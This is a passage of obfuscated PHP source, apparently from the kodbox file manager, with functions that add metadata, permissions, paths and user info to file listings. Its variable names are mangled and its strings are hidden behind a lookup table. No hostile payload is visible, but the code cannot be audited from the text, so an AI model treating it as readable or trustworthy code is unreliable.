_listAppendFileMeta(&$’ëóèĞú, $×îŸÜØŸ) { $§ˆË”ã¯ =& $_SERVER[‰‰Ş‚€]; $×èµú²ú = array_to_keyvalue($’ëóèĞú, $§ˆË”ã¯[22], $§ˆË”ã¯[561]); $×èµú²ú = array_filter(array_unique($×èµú²ú)); $×èµú²ú = array_to_int($×èµú²ú); if (!$×èµú²ú) { return; } $ØÂ¼Êóğ = array($§ˆË”ã¯[562] => array($§ˆË”ã¯[511], $×èµú²ú)); $‰ µ»Òî = $§ˆË”ã¯[563]; $¸Ç×Ã§ñ = Model($§ˆË”ã¯[564])->field($‰ µ»Òî)->where($ØÂ¼Êóğ)->select(); $¸Ç×Ã§ñ = array_to_keyvalue($¸Ç×Ã§ñ, $§ˆË”ã¯[561]); $ï¢£ÄÉÆ = Model($§ˆË”ã¯[565])->field($§ˆË”ã¯[566])->where($ØÂ¼Êóğ)->select(); $ï¢£ÄÉÆ = $ï¢£ÄÉÆ ? $ï¢£ÄÉÆ : array(); $Ïùİİ§ø = array(); foreach ($ï¢£ÄÉÆ as $¯éûÜ¡±) { if (!isset($Ïùİİ§ø[$¯éûÜ¡±[$§ˆË”ã¯[561]]])) { $Ïùİİ§ø[$¯éûÜ¡±[$§ˆË”ã¯[561]]] = array(); } $Ïùİİ§ø[$¯éûÜ¡±[$§ˆË”ã¯[561]]][$¯éûÜ¡±[$§ˆË”ã¯[105]]] = $¯éûÜ¡±[$§ˆË”ã¯[459]]; } foreach ($’ëóèĞú as &$Ü­î’ø) { $ışÏ‘€ = $Ü­î’ø[$§ˆË”ã¯[561]]; if (!$ışÏ‘€ || !is_array($¸Ç×Ã§ñ[$ışÏ‘€])) { continue; } $ Á“®¶š = $¸Ç×Ã§ñ[$ışÏ‘€]; $ Á“®¶š[$§ˆË”ã¯[89]] = $Ü­î’ø[$§ˆË”ã¯[89]]; $ Á“®¶š[$§ˆË”ã¯[42]] = $Ü­î’ø[$§ˆË”ã¯[42]]; if (!$ Á“®¶š[$§ˆË”ã¯[567]]) { Model($§ˆË”ã¯[564])->fileMd5Check($ Á“®¶š); } if (!isset(self::$cacheFileInfo[$§ˆË”ã¯[568] . $ışÏ‘€])) { self::$cacheFileInfo[$§ˆË”ã¯[568] . $ışÏ‘€] = array_merge(array(), $ Á“®¶š); } unset($¸Ç×Ã§ñ[$ışÏ‘€][$§ˆË”ã¯[97]]); $ûôöš©ğ = isset($Ïùİİ§ø[$ışÏ‘€]) && is_array($Ïùİİ§ø[$ışÏ‘€]) ? $Ïùİİ§ø[$ışÏ‘€] : array(); $Ü­î’ø[$§ˆË”ã¯[178]] = array_merge($ûôöš©ğ, $¸Ç×Ã§ñ[$ışÏ‘€]); if (isset($Ü­î’ø[$§ˆË”ã¯[178]][$§ˆË”ã¯[193]])) { $Ü­î’ø[$§ˆË”ã¯[193]] = json_decode($Ü­î’ø[$§ˆË”ã¯[178]][$§ˆË”ã¯[193]], !0); unset($Ü­î’ø[$§ˆË”ã¯[178]][$§ˆË”ã¯[193]]); } } unset($Ü­î’ø); } protected function _listAppendSourceInfo(&$°··µúŸ, $ô¹³Ò) { $ °Ï‡Îó =& $_SERVER[‰‰Ş‚€]; $é°€±¬ = Model($ °Ï‡Îó[569])->listData(); $ØƒÕü‚¸ = Model($ °Ï‡Îó[518])->listData(); $¯²†‰ÑÕ = Model($ °Ï‡Îó[508])->listData(); $¡×âÜ±ï = Model($ °Ï‡Îó[570])->listSimple(); $ãŠğäÏ» = array_to_keyvalue($é°€±¬, $ °Ï‡Îó[491]); $©±Ç¹¢ê = array_to_keyvalue_group($ØƒÕü‚¸, $ °Ï‡Îó[97], $ °Ï‡Îó[519]); $„¥†ş¢· = array_to_keyvalue($¯²†‰ÑÕ, $ °Ï‡Îó[97]); $èÜšƒû™ = array_to_keyvalue_group($¡×âÜ±ï, $ °Ï‡Îó[202]); foreach ($°··µúŸ as &$Âß½ÄÜ) { $Âß½ÄÜ[$ °Ï‡Îó[100]] = array($ °Ï‡Îó[571] => 0, $ °Ï‡Îó[572] => 0, $ °Ï‡Îó[573] => 0); if (isset($„¥†ş¢·[$Âß½ÄÜ[$ °Ï‡Îó[202]]])) { $Âß½ÄÜ[$ °Ï‡Îó[100]][$ °Ï‡Îó[574]] = 1; $Âß½ÄÜ[$ °Ï‡Îó[100]][$ °Ï‡Îó[575]] = $„¥†ş¢·[$Âß½ÄÜ[$ °Ï‡Îó[202]]][$ °Ï‡Îó[42]]; } if ($©±Ç¹¢ê && $ãŠğäÏ» && isset($©±Ç¹¢ê[$Âß½ÄÜ[$ °Ï‡Îó[202]]])) { $Âß½ÄÜ[$ °Ï‡Îó[100]][$ °Ï‡Îó[576]] = array(); foreach ($©±Ç¹¢ê[$Âß½ÄÜ[$ °Ï‡Îó[202]]] as $ö†ÒÉ¡è) { $¥¹ŸûŞ = $ãŠğäÏ»[$ö†ÒÉ¡è]; $Âß½ÄÜ[$ °Ï‡Îó[100]][$ °Ï‡Îó[576]][] = array($ °Ï‡Îó[577] => $¥¹ŸûŞ[$ °Ï‡Îó[491]], $ °Ï‡Îó[513] => $¥¹ŸûŞ[$ °Ï‡Îó[42]], $ °Ï‡Îó[578] => $¥¹ŸûŞ[$ °Ï‡Îó[579]]); } } if ($èÜšƒû™ && isset($èÜšƒû™[$Âß½ÄÜ[$ °Ï‡Îó[202]]])) { $Âß½ÄÜ[$ °Ï‡Îó[100]][$ °Ï‡Îó[580]] = array(); foreach ($èÜšƒû™[$Âß½ÄÜ[$ °Ï‡Îó[202]]] as $¨Íœßíµ) { $Û«¬©«Æ = $ °Ï‡Îó[581]; if ($¨Íœßíµ[$ °Ï‡Îó[582]] == $ °Ï‡Îó[101]) { $Û«¬©«Æ .= $ °Ï‡Îó[583]; } $Âß½ÄÜ[$ °Ï‡Îó[100]][$ °Ï‡Îó[580]] = array_field_key($¨Íœßíµ, explode($ °Ï‡Îó[60], $Û«¬©«Æ)); } } } unset($Âß½ÄÜ); return $°··µúŸ; } protected function _listAppendChildren(&$äê²šŒ, $ê°„»À¦) { $ÒÉ´ûä =& $_SERVER[‰‰Ş‚€]; $Â¯ŒØê = array(); $ÂÍÇ†êó = array($ÒÉ´ûä[250] => 0, $ÒÉ´ûä[251] => 0); foreach ($äê²šŒ as &$­ò¥½¶¦) { if (!$­ò¥½¶¦[$ÒÉ´ûä[504]]) { continue; } $Â¯ŒØê[] = intval($­ò¥½¶¦[$ÒÉ´ûä[202]]); } unset($­ò¥½¶¦); if (!$Â¯ŒØê) { return; } $–ãÁ¤Ò = array($ÒÉ´ûä[201] => array($ÒÉ´ûä[17], $Â¯ŒØê), $ÒÉ´ûä[524] => 0); $–¥íãîµ = array($ÒÉ´ûä[201], $ÒÉ´ûä[504], $ÒÉ´ûä[584] => $ÒÉ´ûä[585]); $¤Á­¯œ = $this->field($–¥íãîµ)->where($–ãÁ¤Ò)->group($ÒÉ´ûä[586])->select(); $àŸâ­Ãé = array(); foreach ($¤Á­¯œ as $ÖµÔ¨) { $‡âş¯ = $ÖµÔ¨[$ÒÉ´ûä[201]]; $á„ö§¼ = $ÖµÔ¨[$ÒÉ´ûä[504]] == $ÒÉ´ûä[101] ? $ÒÉ´ûä[251] : $ÒÉ´ûä[250]; if (!isset($àŸâ­Ãé[$‡âş¯])) { $àŸâ­Ãé[$‡âş¯] = array($ÒÉ´ûä[250] => 0, $ÒÉ´ûä[251] => 0); } $àŸâ­Ãé[$‡âş¯][$á„ö§¼] += $ÖµÔ¨[$ÒÉ´ûä[585]]; } foreach ($äê²šŒ as &$­ò¥½¶¦) { if (!$­ò¥½¶¦[$ÒÉ´ûä[504]]) { continue; } $‹ß¼¨Û´ = is_array($àŸâ­Ãé[$­ò¥½¶¦[$ÒÉ´ûä[202]]]) ? $àŸâ­Ãé[$­ò¥½¶¦[$ÒÉ´ûä[202]]] : $ÂÍÇ†êó; $­ò¥½¶¦[$ÒÉ´ûä[251]] = $‹ß¼¨Û´[$ÒÉ´ûä[251]]; $­ò¥½¶¦[$ÒÉ´ûä[250]] = $‹ß¼¨Û´[$ÒÉ´ûä[250]]; unset($­ò¥½¶¦[$ÒÉ´ûä[505]]); } unset($­ò¥½¶¦); } protected function _listAppendAuth(&$àçÓŸ›•) { $¡¥Øº¨ =& $_SERVER[‰‰Ş‚€]; $ı‰Ï×ûò = array(); foreach ($àçÓŸ›• as $É±ÉÇ¹) { if ($É±ÉÇ¹[$¡¥Øº¨[199]] == self::TYPE_GROUP) { $ı‰Ï×ûò[] = intval($É±ÉÇ¹[$¡¥Øº¨[202]]); } } if (!$ı‰Ï×ûò) { return; } $ÊÂ…½Èî = array_to_keyvalue($àçÓŸ›•, $¡¥Øº¨[202]); $é„«÷×ˆ = Model($¡¥Øº¨[587])->getSourceList($ı‰Ï×ûò, $ÊÂ…½Èî); $·©•Òîê = KodUser::isRoot(); foreach ($àçÓŸ›• as $ˆ¥¹ä±ë => &$É±ÉÇ¹) { $É±ÉÇ¹[$¡¥Øº¨[506]] = $é„«÷×ˆ[$É±ÉÇ¹[$¡¥Øº¨[202]]]; if (!$É±ÉÇ¹[$¡¥Øº¨[506]] && $É±ÉÇ¹[$¡¥Øº¨[199]] == self::TYPE_GROUP) { $É±ÉÇ¹[$¡¥Øº¨[506]] = Action($¡¥Øº¨[588])->pathGroupAuthMake($É±ÉÇ¹[$¡¥Øº¨[589]]); if (!$É±ÉÇ¹[$¡¥Øº¨[506]] && !$·©•Òîê) { $É±ÉÇ¹[$¡¥Øº¨[244]] = !1; $É±ÉÇ¹[$¡¥Øº¨[243]] = !1; } } if ($É±ÉÇ¹[$¡¥Øº¨[506]]) { $É±ÉÇ¹[$¡¥Øº¨[244]] = AuthModel::authCheckEdit($É±ÉÇ¹[$¡¥Øº¨[506]][$¡¥Øº¨[507]]); $É±ÉÇ¹[$¡¥Øº¨[243]] = AuthModel::authCheckView($É±ÉÇ¹[$¡¥Øº¨[506]][$¡¥Øº¨[507]]); } $this->groupPathDisplay($É±ÉÇ¹); } unset($É±ÉÇ¹); } public function _listAppendAuthSecret(&$ˆ¶·ìï) { $¿³ ¥é– =& $_SERVER[‰‰Ş‚€]; if (Model($¿³ ¥é–[526])->get($¿³ ¥é–[590]) != $¿³ ¥é–[101]) { return; } static $ªıÄÃó’ = false; if (!$ªıÄÃó’) { $‘˜Âó Ã = Model($¿³ ¥é–[591]); $ïõ†Öıå = Model($¿³ ¥é–[592]); $ªıÄÃó’ = $ïõ†Öıå->listData(); $ªıÄÃó’ = array_to_keyvalue($ªıÄÃó’, $¿³ ¥é–[202]); $…àÀ”ä = json_decode(Model($¿³ ¥é–[526])->get($¿³ ¥é–[593]), !0); $…àÀ”ä = array_to_keyvalue($…àÀ”ä, $¿³ ¥é–[491]); foreach ($ªıÄÃó’ as $ú­ØÍÀÉ => $ÔÒ©ò¶“) { $ô’«Áµâ = $…àÀ”ä[$ÔÒ©ò¶“[$¿³ ¥é–[594]]]; if (!$ô’«Áµâ) { $ïõ†Öıå->remove($ÔÒ©ò¶“[$¿³ ¥é–[491]]); unset($ªıÄÃó’[$ú­ØÍÀÉ]); continue; } $¶—îòÁû = $‘˜Âó Ã->listData($ô’«Áµâ[$¿³ ¥é–[506]]); if (!$¶—îòÁû) { $ïõ†Öıå->remove($ÔÒ©ò¶“[$¿³ ¥é–[491]]); unset($ªıÄÃó’[$ú­ØÍÀÉ]); continue; } $ÔÒ©ò¶“[$¿³ ¥é–[506]] = $¶—îòÁû; $ÔÒ©ò¶“[$¿³ ¥é–[595]] = $ô’«Áµâ; $ÔÒ©ò¶“[$¿³ ¥é–[596]] = Model($¿³ ¥é–[597])->getInfoSimpleOuter($ÔÒ©ò¶“[$¿³ ¥é–[545]]); $ªıÄÃó’[$ú­ØÍÀÉ] = $ÔÒ©ò¶“; } } $ö âêæ¹ = USER_ID; $öåÊÍ‰® = array(); $´ŠÍÓà» = $this->_listAppendPath($öåÊÍ‰®, !0); foreach ($ˆ¶·ìï as $ú­ØÍÀÉ => &$ÔÒ©ò¶“) { if (!is_array($ÔÒ©ò¶“[$¿³ ¥é–[506]])) { continue; } if ($ÔÒ©ò¶“[$¿³ ¥é–[199]] != $¿³ ¥é–[598]) { continue; } if (isset($ªıÄÃó’[$ÔÒ©ò¶“[$¿³ ¥é–[202]]])) { $áá…²ºô = $ªıÄÃó’[$ÔÒ©ò¶“[$¿³ ¥é–[202]]]; if (!is_array($ÔÒ©ò¶“[$¿³ ¥é–[559]])) { $ÔÒ©ò¶“[$¿³ ¥é–[559]] = array(); } $ÔÒ©ò¶“[$¿³ ¥é–[559]][$¿³ ¥é–[599]] = $áá…²ºô[$¿³ ¥é–[594]]; $ÔÒ©ò¶“[$¿³ ¥é–[506]][$¿³ ¥é–[600]] = $áá…²ºô; $ÔÒ©ò¶“[$¿³ ¥é–[506]][$¿³ ¥é–[601]] = $ÔÒ©ò¶“[$¿³ ¥é–[602]]; $ÔÒ©ò¶“[$¿³ ¥é–[506]][$¿³ ¥é–[603]] = $¿³ ¥é–[101]; if ($áá…²ºô[$¿³ ¥é–[545]] != $ö âêæ¹) { $ÔÒ©ò¶“[$¿³ ¥é–[506]][$¿³ ¥é–[507]] = $ÔÒ©ò¶“[$¿³ ¥é–[506]][$¿³ ¥é–[507]] & $áá…²ºô[$¿³ ¥é–[506]][$¿³ ¥é–[506]]; } continue; } $ğª€éŸÎ = $this->parentLevelArray($ÔÒ©ò¶“[$¿³ ¥é–[604]]); $¶¤¸˜Èù = array_reverse($ğª€éŸÎ); foreach ($¶¤¸˜Èù as $³Ñó‰¯Ì => $‚Ãü”ç) { if (!isset($ªıÄÃó’[$‚Ãü”ç])) { continue; } $áá…²ºô = $ªıÄÃó’[$‚Ãü”ç]; $ÔÒ©ò¶“[$¿³ ¥é–[506]][$¿³ ¥é–[600]] = $áá…²ºô; if ($áá…²ºô[$¿³ ¥é–[545]] != $ö âêæ¹) { $ÔÒ©ò¶“[$¿³ ¥é–[506]][$¿³ ¥é–[507]] = $ÔÒ©ò¶“[$¿³ ¥é–[506]][$¿³ ¥é–[507]] & $áá…²ºô[$¿³ ¥é–[506]][$¿³ ¥é–[506]]; } $ô„„èéá = $¿³ ¥é–[22]; $§Êéó˜È = count($ğª€éŸÎ) - $³Ñó‰¯Ì; for ($Û¥Ñï—• = 0; $Û¥Ñï—• < $§Êéó˜È; $Û¥Ñï—•++) { if (!isset($´ŠÍÓà»[$ğª€éŸÎ[$Û¥Ñï—•]])) { $ô„„èéá = $¿³ ¥é–[22]; break; } $ô„„èéá = $ô„„èéá . rtrim($´ŠÍÓà»[$ğª€éŸÎ[$Û¥Ñï—•]], $¿³ ¥é–[18]) . $¿³ ¥é–[18]; } $ÔÒ©ò¶“[$¿³ ¥é–[506]][$¿³ ¥é–[601]] = rtrim($ô„„èéá, $¿³ ¥é–[18]) . $¿³ ¥é–[18]; break; } } unset($ÔÒ©ò¶“); } public function groupPathDisplay(&$ÊÄ ›ó°) { $Ï•¨Ê¬í =& $_SERVER[‰‰Ş‚€]; if ($ÊÄ ›ó°[$Ï•¨Ê¬í[199]] != self::TYPE_GROUP) { return; } $ìå­ÔÃÆ = Model($Ï•¨Ê¬í[605])->getInfo($ÊÄ ›ó°[$Ï•¨Ê¬í[589]]); $è©İ£Ì‚ = $this->parentLevelArray($ìå­ÔÃÆ[$Ï•¨Ê¬í[604]]); $É»Äë³æ = $Ï•¨Ê¬í[22]; foreach ($è©İ£Ì‚ as $¥şÔşÎ±) { $ÃÌÔ£‹± = Model($Ï•¨Ê¬í[605])->getInfo($¥şÔşÎ±); $É»Äë³æ .= $ÃÌÔ£‹±[$Ï•¨Ê¬í[100]][$Ï•¨Ê¬í[202]] . $Ï•¨Ê¬í[60]; } $ÊÄ ›ó°[$Ï•¨Ê¬í[606]] = $ìå­ÔÃÆ[$Ï•¨Ê¬í[201]]; $ÊÄ ›ó°[$Ï•¨Ê¬í[607]] = $ìå­ÔÃÆ[$Ï•¨Ê¬í[604]]; $ÊÄ ›ó°[$Ï•¨Ê¬í[608]] = $ìå­ÔÃÆ[$Ï•¨Ê¬í[609]]; $ÊÄ ›ó°[$Ï•¨Ê¬í[610]] = $É»Äë³æ . $ìå­ÔÃÆ[$Ï•¨Ê¬í[100]][$Ï•¨Ê¬í[202]]; } protected function _listAppendPath(&$ñÍÍÊùõ, $­‰ü“ß = false) { $‘ñ“§•ô =& $_SERVER[‰‰Ş‚€]; static $í—ÎŞë­ = array(); $”ÅÔÃüü = array(); $ãÁ¤ş›— = array(); if ($­‰ü“ß) { return $í—ÎŞë­; } foreach ($ñÍÍÊùõ as &$ÜÛø†µØ) { $´ï›®»„ = $ÜÛø†µØ[$‘ñ“§•ô[202]]; if ($ÜÛø†µØ[$‘ñ“§•ô[504]] == $‘ñ“§•ô[101] && $ÜÛø†µØ[$‘ñ“§•ô[201]] != 0) { $í—ÎŞë­[$´ï›®»„] = $ÜÛø†µØ[$‘ñ“§•ô[42]]; } if ($ÜÛø†µØ[$‘ñ“§•ô[504]] == $‘ñ“§•ô[101] && $ÜÛø†µØ[$‘ñ“§•ô[201]] == 0) { $í—ÎŞë­[$´ï›®»„] = $this->_listAppendPathRoot($ÜÛø†µØ, array()); } if (isset($ãÁ¤ş›—[$ÜÛø†µØ[$‘ñ“§•ô[604]]])) { continue; } $ãÁ¤ş›—[$ÜÛø†µØ[$‘ñ“§•ô[604]]] = !0; $Ğ—×æ’¨ = $this->parentLevelArray($ÜÛø†µØ[$‘ñ“§•ô[604]]); foreach ($Ğ—×æ’¨ as $ÍÉïº¡ü => $è·Šì) { if (isset($í—ÎŞë­[$è·Šì])) { continue; } if ($ÍÉïº¡ü == 0) { $í—ÎŞë­[$è·Šì] = $this->_listAppendPathRoot($ÜÛø†µØ, $Ğ—×æ’¨); } if ($ÍÉïº¡ü != 0) { $”ÅÔÃüü[] = $è·Šì; } } } unset($ÜÛø†µØ); $”ÅÔÃüü = array_unique($”ÅÔÃüü); if (count($”ÅÔÃüü) > 0) { $ù®¿É« = array($‘ñ“§•ô[510] => array($‘ñ“§•ô[511], $”ÅÔÃüü)); if (count($”ÅÔÃüü) == 1) { $”Û–Ÿ»İ = $this->sourceInfo($”ÅÔÃüü[0]); $«àş÷‡­ = is_array($”Û–Ÿ»İ) ? array($”Û–Ÿ»İ) : !1; } else { $«àş÷‡­ = $this->field($‘ñ“§•ô[611])->where($ù®¿É«)->select(); } if (!$«àş÷‡­) { $«àş÷‡­ = array(); } foreach ($«àş÷‡­ as $°Âºšåæ) { $í—ÎŞë­[$°Âºšåæ[$‘ñ“§•ô[202]]] = $°Âºšåæ[$‘ñ“§•ô[42]]; } } $Ğñ¢Êˆ‰ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ŠˆíŠÎÇ = array(); foreach ($ñÍÍÊùõ as &$ÜÛø†µØ) { $ŒÌªÛÚû = $ÜÛø†µØ[$‘ñ“§•ô[604]]; $â†Æ˜Ç„ = $‘ñ“§•ô[22]; if (isset($ŠˆíŠÎÇ[$ŒÌªÛÚû])) { $â†Æ˜Ç„ = $ŠˆíŠÎÇ[$ŒÌªÛÚû]; } else { $Ğ—×æ’¨ = $this->parentLevelArray($ÜÛø†µØ[$‘ñ“§•ô[604]]); foreach ($Ğ—×æ’¨ as $ÍÉïº¡ü => $è·Šì) { if (isset($í—ÎŞë­[$è·Šì])) { $â†Æ˜Ç„ .= $í—ÎŞë­[$è·Šì] . $‘ñ“§•ô[18]; } } $ŠˆíŠÎÇ[$ŒÌªÛÚû] = $â†Æ˜Ç„; } $â†Æ˜Ç„ .= $ÜÛø†µØ[$‘ñ“§•ô[42]]; if ($ÜÛø†µØ[$‘ñ“§•ô[504]] == $‘ñ“§•ô[101]) { $â†Æ˜Ç„ .= $‘ñ“§•ô[18]; } $ÜÛø†µØ[$‘ñ“§•ô[602]] = str_replace($‘ñ“§•ô[265], $‘ñ“§•ô[18], $â†Æ˜Ç„); if ($ÜÛø†µØ[$‘ñ“§•ô[201]] == $‘ñ“§•ô[239]) { $ÜÛø†µØ[$‘ñ“§•ô[42]] = trim($í—ÎŞë­[$ÜÛø†µØ[$‘ñ“§•ô[202]]], $‘ñ“§•ô[18]); $ÜÛø†µØ[$‘ñ“§•ô[602]] = $ÜÛø†µØ[$‘ñ“§•ô[42]] . $‘ñ“§•ô[18]; } if (intval($ÜÛø†µØ[$‘ñ“§•ô[199]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ÜÛø†µØ, $Ğ—×æ’¨, $Ğñ¢Êˆ‰); } } unset($ÜÛø†µØ); return $ñÍÍÊùõ; } private function _listAppendPathRecycle(&$¾Ñ·¯²š, $°¯úÜêÏ, $²ûËÆÃ•) { $±´ùî—º =& $_SERVER[‰‰Ş‚€]; if (!in_array($²ûËÆÃ•, $°¯úÜêÏ) && $¾Ñ·¯²š[$±´ùî—º[202]] != $²ûËÆÃ•) { return; } $µÄ¶äî™ = explode($±´ùî—º[18], trim($¾Ñ·¯²š[$±´ùî—º[602]], $±´ùî—º[18])); $şˆ‚ô±Í = implode($±´ùî—º[18], array_slice($µÄ¶äî™, 2)); $¾Ñ·¯²š[$±´ùî—º[602]] = $±´ùî—º[18] . LNG($±´ùî—º[612]) . $±´ùî—º[18] . ltrim($şˆ‚ô±Í, $±´ùî—º[18]); $¾Ñ·¯²š[$±´ùî—º[604]] = $±´ùî—º[613] . implode($±´ùî—º[60], array_slice($°¯úÜêÏ, 1)) . $±´ùî—º[60]; if ($¾Ñ·¯²š[$±´ùî—º[202]] == $²ûËÆÃ•) { $¾Ñ·¯²š[$±´ùî—º[604]] = $±´ùî—º[613]; $¾Ñ·¯²š[$±´ùî—º[201]] = $±´ùî—º[239]; $¾Ñ·¯²š[$±´ùî—º[42]] = LNG($±´ùî—º[612]); } $¾Ñ·¯²š[$±´ùî—º[614]] = $±´ùî—º[615]; } protected function _listAppendPathRoot(&$Æ°ğ£“›, $ç‚¥‹Á) { $É¥™İ†à =& $_SERVER[‰‰Ş‚€]; static $©‰‘Êé¢ = false; static $ô±ßµªí = false; $ï¢¥ØŒ¸ = $É¥™İ†à[22]; if ($Æ°ğ£“›[$É¥™İ†à[199]] == self::TYPE_USER) { if ($Æ°ğ£“›[$É¥™İ†à[589]] == USER_ID) { $ï¢¥ØŒ¸ = LNG($É¥™İ†à[616]); if ($©‰‘Êé¢ === !1) { $ÚùàÕ’é = Model($É¥™İ†à[617])->getInfoFull(USER_ID); $©‰‘Êé¢ = _get($ÚùàÕ’é, $É¥™İ†à[618], $É¥™İ†à[22]); } if ($ô±ßµªí === !1) { $ÚùàÕ’é = Model($É¥™İ†à[617])->getInfoFull(USER_ID); $ô±ßµªí = _get($ÚùàÕ’é, $É¥™İ†à[619], $É¥™İ†à[22]); } if ($ç‚¥‹Á && $ç‚¥‹Á[0] == $©‰‘Êé¢ || !$ç‚¥‹Á && $Æ°ğ£“›[$É¥™İ†à[202]] == $©‰‘Êé¢) { $ï¢¥ØŒ¸ = LNG($É¥™İ†à[620]); $Æ°ğ£“›[$É¥™İ†à[621]] = $É¥™İ†à[622]; } if ($ç‚¥‹Á && $ç‚¥‹Á[0] == $ô±ßµªí || !$ç‚¥‹Á && $Æ°ğ£“›[$É¥™İ†à[202]] == $ô±ßµªí) { $ï¢¥ØŒ¸ = $ï¢¥ØŒ¸ . $É¥™İ†à[623] . LNG($É¥™İ†à[624]); } if (!$ç‚¥‹Á) { $Æ°ğ£“›[$É¥™İ†à[42]] = $ï¢¥ØŒ¸; } } else { $ÚùàÕ’é = Model($É¥™İ†à[617])->getInfoFull($Æ°ğ£“›[$É¥™İ†à[589]]); $Ò²¡¯ô» = _get($ÚùàÕ’é, $É¥™İ†à[619], $É¥™İ†à[22]); $Æ°ğ£“›[$É¥™İ†à[625]] = Model($É¥™İ†à[597])->getInfoSimpleOuter($Æ°ğ£“›[$É¥™İ†à[589]]); $ï¢¥ØŒ¸ = LNG($É¥™İ†à[626]) . $É¥™İ†à[184] . $Æ°ğ£“›[$É¥™İ†à[625]][$É¥™İ†à[42]] . $É¥™İ†à[186]; if ($ç‚¥‹Á && $ç‚¥‹Á[0] == $Ò²¡¯ô» || !$ç‚¥‹Á && $Æ°ğ£“›[$É¥™İ†à[202]] == $Ò²¡¯ô») { $ï¢¥ØŒ¸ = LNG($É¥™İ†à[626]) . $É¥™İ†à[627] . $Æ°ğ£“›[$É¥™İ†à[625]][$É¥™İ†à[42]] . $É¥™İ†à[623] . LNG($É¥™İ†à[624]) . $É¥™İ†à[186]; } } } else { if ($Æ°ğ£“›[$É¥™İ†à[199]] == self::TYPE_GROUP) { $—ı…ä = Model($É¥™İ†à[605])->getInfoSimple($Æ°ğ£“›[$É¥™İ†à[589]]); $ï¢¥ØŒ¸ = $—ı…ä[$É¥™İ†à[42]]; } else { if ($Æ°ğ£“›[$É¥™İ†à[199]] == self::TYPE_SYSTEM) { $ï¢¥ØŒ¸ = $É¥™İ†à[628]; } } } $ï¢¥ØŒ¸ = $ï¢¥ØŒ¸ ? $É¥™İ†à[18] . $ï¢¥ØŒ¸ . $É¥™İ†à[18] : $É¥™İ†à[18]; return $ï¢¥ØŒ¸; } protected function _listAppendUser(&$ „’ô•) { $«ú¾®ä» =& $_SERVER[‰‰Ş‚€]; $‚²ìÛÜº = array_to_keyvalue($ „’ô•, $«ú¾®ä»[22], $«ú¾®ä»[545]); $ÖÇğùÂ = array_to_keyvalue($ „’ô•, $«ú¾®ä»[22], $«ú¾®ä»[547]); $öîŸÄáœ = array_merge($‚²ìÛÜº, $ÖÇğùÂ); $úõÅŞ½¾ = Model($«ú¾®ä»[617])->userListInfo($öîŸÄáœ); foreach ($ „’ô• as &$¿‰øÀ¶Ê) { $á¡³„ĞÉ = $¿‰øÀ¶Ê[$«ú¾®ä»[545]]; $¿‰øÀ¶Ê[$«ú¾®ä»[545]] = $úõÅŞ½¾[$á¡³„ĞÉ] ? $úõÅŞ½¾[$á¡³„ĞÉ] : !1; $á¡³„ĞÉ = $¿‰øÀ¶Ê[$«ú¾®ä»[547]]; $¿‰øÀ¶Ê[$«ú¾®ä»[547]] = $úõÅŞ½¾[$á¡³„ĞÉ] ? $úõÅŞ½¾[$á¡³„ĞÉ] : !1; if (_get($¿‰øÀ¶Ê, $«ú¾®ä»[629], 0)) { $†×” = $GLOBALS[$«ú¾®ä»[16]][$«ú¾®ä»[102]][$«ú¾®ä»[630]]; if ($¿‰øÀ¶Ê[$«ú¾®ä»[559]][$«ú¾®ä»[631]] <= time() - $†×”) { $this->metaSet($¿‰øÀ¶Ê[$«ú¾®ä»[202]], $«ú¾®ä»[632], null); $this->metaSet($¿‰øÀ¶Ê[$«ú¾®ä»[202]], $«ú¾®ä»[631], null); unset($¿‰øÀ¶Ê[$«ú¾®ä»[559]][$«ú¾®ä»[632]]); continue; } $ˆ®¤²¦ê = $¿‰øÀ¶Ê[$«ú¾®ä»[559]][$«ú¾®ä»[632]]; $¿‰øÀ¶Ê[$«ú¾®ä»[559]][$«ú¾®ä»[633]] = Model($«ú¾®ä»[617])->getInfoSimpleOuter($ˆ®¤²¦ê); } } unset($¿‰øÀ¶Ê); } public function parentLevelArray($’É—Òìƒ) { $½Ì¦Š‘’ =& $_SERVER[‰‰Ş‚€]; $’É—Òìƒ = explode($½Ì¦Š‘’[60], trim($’É—Òìƒ, $½Ì¦Š‘’[60])); return array_to_int(array_filter($’É—Òìƒ)); } public function listAll($Á‰ûíÄÄ) { $Ğ—¶âƒÒ =& $_SERVER[‰‰Ş‚€]; $³õÕ¬ñğ = $this->sourceInfo($Á‰ûíÄÄ); $éÆà¨ËĞ = array($Ğ—¶âƒÒ[634] => array($Ğ—¶âƒÒ[635], $³õÕ¬ñğ[$Ğ—¶âƒÒ[604]] . $Á‰ûíÄÄ . $Ğ—¶âƒÒ[636]), $Ğ—¶âƒÒ[637] => 0); $Ğ ü—¦ë = $Ğ—¶âƒÒ[638]; $Ø­°Ş•Ğ = "\114\105\106\x54\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x69\157\137\146\x69\154\x65\x20\x66\x69\154\x65\40\x6f\x6e\40\x73\157\x75\162\x63\145\56\146\151\154\145\x49\x44\x20\75\x20\x66\x69\x6c\x65\x2e\146\151\154\x65\111\104"; $Ğ÷–üå = $this->alias($Ğ—¶âƒÒ[537])->field($Ğ ü—¦ë)->where($éÆà¨ËĞ)->join($Ø­°Ş•Ğ)->select(); $this->_listAppendAuth($Ğ÷–üå); $this->_listAppendUser($Ğ÷–üå); $this->_listAppendPath($Ğ÷–üå); $Ğ÷–üå = array_to_keyvalue($Ğ÷–üå, $Ğ—¶âƒÒ[202]); $Ì½§Ç÷˜ = "\x2f{$³õÕ¬ñğ[$Ğ—¶âƒÒ[42]]}\57"; $Ì½§Ç÷˜ = $Ì½§Ç÷˜ == $Ğ—¶âƒÒ[265] ? $Ğ—¶âƒÒ[18] : $Ì½§Ç÷˜; $¼íÑ¿áø = array(); foreach ($Ğ÷–üå as $¥üÊå¢÷ => $Õ¦µ– ô) { $öœªßÙƒ = $this->parentLevelArray($Õ¦µ– ô[$Ğ—¶âƒÒ[604]]); array_shift($öœªßÙƒ); $Ü¢š× = $Ì½§Ç÷˜; for ($„‘´ûİ = 0; $„‘´ûİ < count($öœªßÙƒ); $„‘´ûİ++) { $Ü¢š× .= $Ğ÷–üå[$öœªßÙƒ[$„‘´ûİ]][$Ğ—¶âƒÒ[42]] . $Ğ—¶âƒÒ[18]; } $Ü¢š× .= $Õ¦µ– ô[$Ğ—¶âƒÒ[42]]; if ($Õ¦µ– ô[$Ğ—¶âƒÒ[504]]) { $Ü¢š× .= $Ğ—¶âƒÒ[18]; } $”û»ë = array($Ğ—¶âƒÒ[514] => 